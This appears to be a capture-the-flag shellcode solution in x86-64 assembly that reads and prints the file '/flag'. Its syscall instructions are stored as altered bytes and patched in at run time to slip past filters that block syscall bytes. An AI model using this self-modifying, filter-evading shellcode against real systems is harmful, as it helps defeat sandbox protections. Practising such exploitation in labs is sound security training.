.global _start
.intel_syntax noprefix

_start:
	mov al , 2
	lea edi, [rip+file]
	xor esi, esi
	inc byte ptr [rip]
	.byte 0x0e, 0x05

	mov esi, eax
	xor edi, edi
	inc edi
	xor edx, edx
	mov r10b, 20
	mov al, 40
	inc byte ptr [rip]
	.byte 0x0e, 0x05
	#syscall

	mov al, 60
	#syscall
	inc byte ptr [rip]
	.byte 0x0e, 0x05
file:
	.string "/flag"

